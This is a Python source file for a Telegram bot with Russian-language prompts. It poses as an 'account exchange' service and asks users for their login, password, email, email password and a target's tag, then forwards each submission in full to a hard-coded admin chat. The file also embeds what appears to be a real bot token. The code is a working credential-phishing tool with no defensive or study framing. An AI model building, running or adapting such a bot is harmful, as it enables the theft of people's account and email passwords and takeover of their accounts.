import telebot
from telebot import types

TOKEN = "7837835834:AAHm3-hrbWlZ5tpKB2W6T16-keyolIQ-q84"
ADMIN_ID = 6760627781  # Замените на ваш ID

bot = telebot.TeleBot(TOKEN)
user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    try:
        markup = types.ReplyKeyboardRemove()
        msg = bot.send_message(
            message.chat.id,
            "👋 Привет! Это бот для обмена аккаунтами.\n\n"
            "📝 Заполни данные:\n\n"
            "Логин:\n"
            "Пароль:\n"
            "Почта (если есть):\n"
            "Пароль от почты (если есть):\n"
            "Тег человека:",
            reply_markup=markup
        )
        bot.register_next_step_handler(msg, process_data)
    except Exception as e:
        print(f"Ошибка: {e}")

def process_data(message):
    try:
        data = message.text.split('\n')
        user_id = message.from_user.id
        
        user_data[user_id] = {
            'login': data[0].replace("Логин:", "").strip(),
            'password': data[1].replace("Пароль:", "").strip(),
            'email': data[2].replace("Почта (если есть):", "").strip(),
            'email_pass': data[3].replace("Пароль от почты (если есть):", "").strip(),
            'target': data[4].replace("Тег человека:", "").strip()
        }
        
        # Отправка админу
        report = f"""
        🚨 Новый запрос на обмен!
        👤 От: @{message.from_user.username}
        🔑 Логин: {user_data[user_id]['login']}
        🔒 Пароль: {user_data[user_id]['password']}
        📧 Почта: {user_data[user_id]['email'] or 'Нет'}
        🗝 Пароль от почты: {user_data[user_id]['email_pass'] or 'Нет'}
        🎯 Тег цели: {user_data[user_id]['target']}
        """
        bot.send_message(ADMIN_ID, report)
        
        bot.send_message(message.chat.id, "✅ Данные отправлены! Скоро с вами свяжутся.")
        
    except IndexError:
        bot.send_message(message.chat.id, "❌ Ошибка формата! Используйте шаблон из сообщения.")
    except Exception as e:
        bot.send_message(message.chat.id, "⚠️ Произошла ошибка, попробуйте позже.")
        bot.send_message(ADMIN_ID, f"Ошибка у @{message.from_user.username}: {str(e)}")

if __name__ == "__main__":
    print("Бот запущен...")
    bot.polling(none_stop=True)
